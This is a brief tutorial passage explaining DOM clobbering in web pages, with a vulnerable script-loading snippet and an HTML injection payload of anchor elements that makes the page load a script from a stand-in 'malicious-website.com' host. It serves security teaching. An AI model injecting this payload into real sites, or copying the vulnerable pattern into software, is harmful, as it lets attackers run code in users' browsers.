The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as `submit`, to interfere with a form's actual `submit()` function.

# Exploit
```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```